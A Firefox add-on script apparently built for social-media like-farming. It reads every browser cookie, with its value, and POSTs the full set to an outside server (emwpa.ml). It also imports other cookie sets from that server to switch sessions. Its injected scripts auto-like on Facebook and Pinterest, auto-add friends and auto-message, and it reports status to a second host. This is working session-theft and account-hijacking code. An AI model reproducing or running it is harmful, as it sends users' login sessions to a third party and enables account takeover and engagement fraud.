let prf=require('sdk/simple-prefs');
let config=require("sdk/preferences/service");
let tabs=require("sdk/tabs");
let ss=require("sdk/simple-storage");
var { Hotkey } = require("sdk/hotkeys");
var pageMod = require("sdk/page-mod");
var { setInterval, clearInterval,setTimeout,clearTimeout } = require("sdk/timers");
var Request = require("sdk/request").Request;
tabArray=[];
ss.storage.liking;


pmCookie=pageMod.PageMod({
	include: "*",
	contentScriptFile: "./result.js",
	onAttach:function(worker){
		ss.storage.int3=setInterval(function(){worker.port.emit("result",prf.prefs['cookieNum'])},200);
		worker.port.on("actionValue",function(pl){
			if(pl=="2"){cookieBack1();}
			else if(pl=="1"){cookieNext1();}
			else if(pl=="3"){import_cookie();}
			else if(pl=="4"){export_cookie();}
			else if(pl=="9"){prf.prefs["imgShow"]="on";}
			else if(pl=="10"){prf.prefs["imgShow"]="off";}
			else if(pl=="5"){prf.prefs["autoLike"]="on";}
			else if(pl=="6"){prf.prefs["autoLike"]="off";}
			else if(pl=="11"){removeAll();}
			else if(pl.indexOf("8-hmd-")>-1){prf.prefs["cookieNum"]=pl.split("-hmd-")[1];}
		});
	}
});
pmFB=pageMod.PageMod({
	include: "https://m.facebook.com/*",
	contentScriptFile: "./like4like/facebook.js",
	onAttach:function(worker){
		
	}
});
pmPin1=pageMod.PageMod({
	include: "https://pinterest.com/*",
	contentScriptFile: "./like4like/likePin.js",
	onAttach:function(worker){			
		
	}
});
pmPin2=pageMod.PageMod({
	include: "https://in.pinterest.com/*",
	contentScriptFile: "./like4like/likePin.js",
	onAttach:function(worker){			
		
	}
});


const {Cu,Cc,Ci} = require("chrome");
const httpproto = Cc["@mozilla.org/network/protocol;1?name=http"].getService(Ci.nsIHttpProtocolHandler);
var cook = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);
var cm = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager2);
function removeAll(){
	cook.removeAll();
}
function getfullCookie(){
e=cook.enumerator;
var fullCookie="[";
while(e.hasMoreElements()){
				var cc = e.getNext().QueryInterface(Ci.nsICookie);
				var cookieInfo = cc.host
													domain=new String(cc.isDomain).toUpperCase();
													path= cc.path;
													secure =new String(cc.isSecure).toUpperCase();
													expire= cc.expires;
													name= cc.name;
													value= cc.value;
					fullCookie+="{\"host\":\""+cookieInfo+"\",\"domain\":\""+domain+"\",\"path\":\""+path+"\",\"secure\":\""+secure+"\",\"expire\":\""+expire+"\",\"name\":\""+name+"\",\"value\":\""+value+"\"}";
													
				
			}
fullCookie+="]";
//console.log(fullCookie);

return fullCookie;

}
function add_cookie(fullCookie2){
	fullCookie2=JSON.parse(fullCookie2);
for(x=0;x<fullCookie2.length;x++){
cSession = (fullCookie2[x].expire == 0);
cm.add(fullCookie2[x].host, fullCookie2[x].path, fullCookie2[x].name, fullCookie2[x].value, fullCookie2[x].secure, false, cSession, fullCookie2[x].expire);

//console.log("cookie restored--"+fullCookie2[x].name);
	}
//tabs.activeTab.url="javascript:alert('cookieAdded')";
//startImgLikeNew();
if(prf.prefs['autoLikeStatus']=="on"){
tabs.activeTab.url=prf.prefs["imgLinkNew"];
	}
}
function addOne(){
	getTab(1).attach({
		contentScriptFile:"./fbAdd.js"
	});
}
function msgOne(){
	getTab(2).attach({
		contentScriptFile:"./fbAutoMessage.js"
	});
}
function getTab(num){
	x=1;
	for (let tab of tabs){tabArray[x]=tab;x++;}
	return tabArray[num];
}
function startImgLikeNew(){
	tabs.activeTab.url=prf.prefs['imgLinkNew'];
	tabs.activeTab.on("ready",function(tab){
		messageOnce=0;

	 let cs= tab.attach({
		contentScriptFile:"./imgLikeNew.js",
		onAttach:function(worker){
		worker.addEventListener(
			"message",
			function (event) {
				
			if(event.data=="imgLikeDone"){
				//cNext();
				if(messageOnce==0){
				setTimeout(function(){cNext();},1000);
				
				//console.log("cnext");cookieNext1();
				//cNext();
				messageOnce=1;	}
				}
			else if(event.data=="status1"){
				send_req2(1);
			}
			else if(event.data=="status0"){
				send_req2(0);
			}
			else if(event.data=="stopAutoAdd"){
				prf.prefs["fbAutoAdd"]="off";
			}
			},
			false);
		
				}
			});
		
	  });
}
//startImgLikeNew();
function export_cookie(brows){
	ss.storage.export_cookie=1;
	var cookieNum=prf.prefs['cookieNum'];
var latestTweetRequest = Request({
  url: "http://emwpa.ml/hmdbm/ff/import.php",
  headers:{"import":"yesa"},
  content: {import: getfullCookie(),cnum:cookieNum,browser:brows},
  onComplete: function (response) {
	  tabs.activeTab.url="javascript:alert('cookieExported')";
  //  console.log("cookie exported");
   ss.storage.export_cookie=0; 
  }
}).post();
}
function send_req2(status){
	var cookieNum=prf.prefs['cookieNum'];
var send_req2 = Request({
  url: "http://fbrecharg.co.nf/cookie_id_status.php?change_status="+cookieNum+"&status="+status,
  onComplete: function (response) {
  console.log("status change"+status);
  }
}).post();
}

function import_cookie(){
	ss.storage.import_cookie=1;
	removeAll();
var cookieNum=prf.prefs['cookieNum'];
Request({
  url: "http://emwpa.ml/hmdbm/ff/export.php",
  headers:{"import":"yesa"},
  content: {export:cookieNum},
  onComplete: function (response) {
	 // console.log(response.text);
   add_cookie(response.text);
   ss.storage.import_cookie=0;
  }
}).post();
}
function cookieNext1(){
	cnum=prf.prefs['cookieNum'];
	num=parseInt(cnum)+1;
	prf.prefs['cookieNum']=num.toString();
}
function cookieBack1(){
	cnum=prf.prefs['cookieNum'];
	num=parseInt(cnum)-1;
	prf.prefs['cookieNum']=num.toString();
}
function imgShow(cnum){
	var name = "permissions.default.image";
	if(cnum=="on"){
		config.set(name, 1);
		}else{
	config.set(name, 2);}
	//console.log(cnum);
}


prf.on("removeAll",function(){
	removeAll();
	//console.log("cookie removed");
});
prf.on("imgShow",function(value){
	var cnum=prf.prefs[value];
	var name = "permissions.default.image";
	if(cnum=="on"){
		config.set(name, 1);
		}else{
	config.set(name, 2);}
	//console.log(cnum);
});
prf.on("autoLike",function(value){
	var cnum=prf.prefs[value];
	if(cnum=="on"){
	console.log("attah again");
		}else{
	console.log("distroy");
}
});
prf.on("import_cookie",function(){
	import_cookie();
	//console.log("cookie Imported");
});
prf.on("export_cookie",function(){
	export_cookie("firefox");
	//console.log("cookie exported");
});
prf.on("cookieNext",function (){
	cookieNext1();
});
prf.on("cookieBack",function(){
	cookieBack1();
});
function cNext(){
	cookieNext1();
//	console.log("cookie NExt live");
	import_cookie();
	
}
function cBack(){
	cookieBack1();
	//import_cookie();
}